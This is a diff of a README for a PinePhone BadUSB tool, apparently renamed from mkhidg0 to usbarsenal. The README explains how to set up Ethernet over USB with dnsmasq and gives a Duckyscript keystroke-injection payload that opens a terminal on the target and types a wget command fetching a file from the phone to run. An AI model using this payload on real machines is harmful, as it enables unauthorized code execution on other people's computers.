@@ -29,16 +29,16 @@ Only en_US and es_ES are supported right now, I'll work on more layouts when I g
 
 The badusb script uses conventional Duckyscript, and its usage is:
 
-`sudo mkhidg0` (you need to enable /dev/hidg0 first, tho mkhidg0 also enables the ecm module of USB Gadget, so you'll have ethernet over USB, too. Just keep in mind that your target won't get an IP address automatically assigned without a proper dhcp server running. I personally like to use dnsmasq)
+`sudo usbarsenal` (you need to enable /dev/hidg0 first, tho usbarsenal also has options for enabling the ecm module of USB Gadget and Mass Storage, so you'll have ethernet over USB, too. Just keep in mind that your target won't get an IP address automatically assigned without a proper dhcp server running. I personally like to use dnsmasq)
 `sudo badusb duckypayload.txt`
 
 
 # Example payload using HID + Ethernet
 
-By default, `mkhidg0` enables HID and ethernet over usb. The only downside right now is that it isn't configured automatically, so you'll have to do it yourself. Let's look at an example:
+`usbarsenal` can enable Ethernet over USB, and that can be used for different kinds of attack. The only thing you have to keep in mind is that you need to manually assign an IP address to the usb0 interface, as well as a netmask and you also need a proper dhcp and dns server (like dnsmasq) so that the target machine gets assigned an IP address automatically.
 
 Let's say we have a file we want the target to download and execute, a file hosted on the PinePhone itself (like `python -m http.server` for example).
-We'll need to prepare the usb0 interface and a dhcp server so the computer gets an IP assigned: `sudo mkhidg0`, `sudo ifconfig usb0 up 10.0.0.1 netmask 255.255.255.0`. Then, the dhcp server with this `dnsmasq.conf` configuration:
+We'll need to prepare the usb0 interface and a dhcp server so the computer gets an IP assigned: `sudo usbarsenal`, `sudo ifconfig usb0 up 10.0.0.1 netmask 255.255.255.0`. Then, the dhcp server with this `dnsmasq.conf` configuration:
 
 ```
 interface=usb0
@@ -54,9 +54,9 @@ listen-address=127.0.0.1
 
 ```
 DELAY 2000
-GUI
+ALT F2
 DELAY 500
-STRING terminal
+STRING xfce4-terminal
 ENTER
 DELAY 1000
 STRING wget http://10.0.0.1:8000/hello
